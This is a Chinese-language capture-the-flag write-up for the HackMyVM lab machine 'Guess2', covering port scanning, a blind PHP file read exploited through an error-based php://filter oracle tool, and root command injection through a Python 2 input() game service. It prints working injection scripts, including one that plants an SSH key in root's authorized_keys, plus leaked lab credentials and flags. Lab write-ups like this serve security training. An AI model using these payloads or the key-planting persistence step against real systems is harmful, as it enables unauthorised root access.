---
title: Guess2_Ahiz
date: 2026-07-19T15:57:53+08:00
lastmod: 2026-07-19T15:57:53+08:00
---

# Guess2_Ahiz

# 信息收集

```
nmap -p- 192.168.100.37    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-18 01:16 EDT
Nmap scan report for 192.168.100.37
Host is up (0.0024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:23:4D:F3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds

```

# 80端口

```
<?php
# file: /opt/pass.txt
# hint: OSINT、hash_kitten、Oracle、filter
highlight_file(__FILE__);
@file($_POST[0]);
```

‍

```
OSINT	Google 搜索 hash_kitten CTF	发现 DownUnderCTF 2022 原题
hash_kitten	搜索 hash_kitten DownUnderCTF writeup	作者为 @hash_kitten，原题名为 minimal-php
Oracle	搜索 PHP filter error based oracle	Synacktiv 博客详细描述了该技术
filter	结合 Synacktiv 文章	php://filter 链式编码实现 error-based oracle

```

```
原题仓库：github.com/DownUnderCTF/Challenges_2022_Public/tree/main/web/minimal-php
Synacktiv 博客：synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle
利用工具：github.com/synacktiv/php_filter_chains_oracle_exploit
```

```
highlight_file(__FILE__)	展示当前文件源码
@file($_POST[0])	通过 POST 参数 0 读取任意文件，但不输出内容
@ 错误抑制符	压制所有 warning/notice，但不能压制 Fatal Error
无 echo/print	file() 的返回值（数组）被直接丢弃，响应中永远看不到文件内容
```

这是一个典型的**盲文件读取**漏洞：可以读取文件，但没有任何输出。传统的 LFI 技巧（如 `php://filter/convert.base64-encode/resource=...`）在这里完全无效

虽然 `@`​ 抑制了普通错误，但 ​**PHP Fatal Error**（如内存耗尽）无法被抑制，会导致：

- HTTP 状态码 `500 Internal Server Error`
- 响应内容可能截断或为空

利用这一特性，将 HTTP 状态码（200 vs 500）作为​**信息通道**，每次泄露 1 bit。

```
php_filter_chains_oracle_exploit-main>python filters_chain_oracle_exploit.py --target http://192.168.100.37/ --file /opt/pass.txt --parameter 0
[*] The following URL is targeted : http://192.168.100.37/
[*] The following local file is leaked : /opt/pass.txt
[*] Running POST requests
[+] File /opt/pass.txt leak is finished!
bGwxMDQ1Njc6TTVDZjRqdTduV1JuWE1aekdkc3cK
b'll104567:M5Cf4ju7nWRnXMZzGdsw\n'
```

```
文件路径: /opt/pass.txt
文件内容: ll104567:M5Cf4ju7nWRnXMZzGdsw
```

‍

# ssh连接

发现还有一个用户

```
yepian 
```

发现opt目录下有个压缩包

```
ll104567@Guess2:~$ ls -la /opt/
backup.zip  pass.txt
```

没找到密码 ZIP文件有密码保护，简单密码字典未能破解：

先看其他的

# 查看监听端口

`ss -tlnp`

```
ll104567@Guess2:/opt$ ss -tlnp
State                       Recv-Q                      Send-Q                                           Local Address:Port                                            Peer Address:Port                      Process                      
LISTEN                      0                           511                                                    0.0.0.0:80                                                   0.0.0.0:*                                                      
LISTEN                      0                           128                                                    0.0.0.0:22                                                   0.0.0.0:*                                                      
LISTEN                      0                           5                                                    127.0.0.1:2026                                                 0.0.0.0:*                                                      
LISTEN                      0                           511                                                       [::]:80                                                      [::]:*                                                      
LISTEN                      0                           128                                                       [::]:22                                                      [::]:*         
```

发现127.0.0.1:2026

2026端口

  

```
timeout 3 bash -c "exec 3<>/dev/tcp/127.0.0.1/2026; cat <&3"
```

```
$ ps aux | grep guess
root  1208  /usr/local/bin/python2 /root/guess.py
```

游戏以 **root** 身份运行，使用 **Python 2**

# Python2 `input()` 代码注入

```
python3 -c "
import socket
s = socket.socket()
s.settimeout(5)
s.connect(('127.0.0.1', 2026))
print(s.recv(4096).decode())         # 读 banner

# 关键：如果游戏用的是 input()，这个命令会被执行！
payload = '__import__(\"os\").system(\"id > /tmp/pwned.txt\")'
s.send(payload.encode() + b'\n')

import time; time.sleep(0.5)
print(s.recv(4096).decode())         # 看响应
s.close()
"

# 检查注入是否成功
cat /tmp/pwned.txt
# uid=0(root) gid=0(root) groups=0(root)    ← root 命令执行成功!!!
```

### 把公钥写入靶机的 root 

```
cat /home/kali/.ssh/id_ed25519.pub   
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBK47EAyAcDqxMYzZBPCGRGYrfsvIRWPfDb8cAhu6tJo kali@kali

```

‍

```
cat > /tmp/inject.py << 'EOF'
import socket, base64

s = socket.socket()
s.settimeout(5)
s.connect(('127.0.0.1', 2026))
s.recv(4096)

cmd = 'mkdir -p /root/.ssh && echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBK47EAyAcDqxMYzZBPCGRGYrfsvIRWPfDb8cAhu6tJo kali@kali >> /root/.ssh/authorized_keys'
cmd_b64 = base64.b64encode(cmd.encode()).decode()
payload = "__import__('os').system(__import__('base64').b64decode('" + cmd_b64 + "').decode())"

s.send(payload.encode() + b'\n')
import time; time.sleep(0.5)
print(s.recv(4096).decode())
s.close()
EOF

```

```
python3 /tmp/inject.py
```

‍

```
ssh -i /home/kali/.ssh/id_ed25519 root@192.168.100.37
Linux Guess2 7.0.11-1-liquorix-amd64 #1 ZEN SMP PREEMPT liquorix 7.0-12.1~trixie (2026-06-01) x86_64

                                   .     **                                     
                                *           *.                                  
                                              ,*                                
                                                 *,                             
                         ,                         ,*                           
                      .,                              *,                        
                    /                                    *                      
                 ,*                                        *,                   
               /.                                            .*.                
             *                                                  **              
             ,*                                               ,*                
                **                                          *.                  
                   **                                    **.                    
                     ,*                                **                       
                        *,                          ,*                          
                           *                      **                            
                             *,                .*                               
                                *.           **                                 
                                  **      ,*,                                   
                                     ** *,     HackMyVM

Welcome to MazeSec
QQ Group:   321948805
root@Guess2:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Guess2:~# cat /root/root.txt 
flag{root-b371b86c0a18386c23a7480a739f76eb}
root@Guess2:~# cat /home/
ll104567/ yepian/   
root@Guess2:~# cat /home/yepian/user.txt 
flag{user-7330f29a39ced87e2006a10ae82684ca}

```
